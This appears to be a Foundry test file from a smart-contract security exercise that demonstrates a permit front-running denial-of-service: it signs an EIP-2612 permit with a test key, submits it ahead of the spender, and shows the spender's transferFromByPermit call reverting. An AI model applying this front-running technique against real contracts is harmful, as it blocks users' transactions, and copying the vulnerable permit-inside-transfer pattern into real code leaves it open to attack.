// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "src/007-permit-dos-attack/TokenA.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract testTokenA is Test {
    TokenA tokenA; 
    uint256 AlicePriv = 0x1234;
    address Alice = vm.addr(AlicePriv);
    address Bob = makeAddr("Bob");
    address Frank = makeAddr("Frank");

    bytes32 public constant TOKEN_PERMISSIONS_TYPEHASH = keccak256("TokenPermissions(address token,uint256 amount)");
    bytes32 public constant PERMIT_TYPEHASH =
    keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    function setUp() public {
        tokenA = new TokenA("TokenA");
        deal(address(tokenA), Alice, 100 ether);
        deal(address(tokenA), Bob, 100 ether);
        deal(address(tokenA), Frank, 100 ether);
    }

    function testTransfer11() public{
         // Alice appproves Bob to transfer 10 ether to other people 
        (uint8 v, bytes32 r, bytes32 s) = getPermitTransferFromSignature(address(tokenA), Bob, 10 ether, tokenA.nonces(Alice), block.timestamp + 100, AlicePriv);

 
        // the following is to simulate front-running, uncomment them to see when there is no front-running DOS
        tokenA.permit(Alice, Bob, 10 ether, block.timestamp + 100, v, r, s);


        // Bob uses the permit to transfer 7 ether to Frank
        vm.startPrank(Bob);
        vm.expectRevert(); // with front-running, we will have a invalid signature issue due to the advancing of nonce
        tokenA.transferFromByPermit(Alice, Frank, 7 ether, 10 ether, block.timestamp + 100, v, r, s);
        vm.stopPrank();

        console2.log("Frank balance: ", tokenA.balanceOf(Frank));
 

    }

    function getPermitTransferFromSignature(
        address token,
        address spender,
        uint256 amount,
        uint256 nonce,
        uint256 deadline,
        uint256 ownerPrivateKey
    ) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        address owner = vm.addr(ownerPrivateKey);
        bytes32 msgHash = keccak256(
            abi.encodePacked(
                "\x19\x01", // EIP-191 header (x19 - indicates non RLP format, 0x01 - indicates EIP 712 structured data)
                ERC20Permit(token).DOMAIN_SEPARATOR(),
                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, amount, nonce, deadline))         // spender is the person who can call it
            )
        );
        return vm.sign(ownerPrivateKey, msgHash);
    }
}
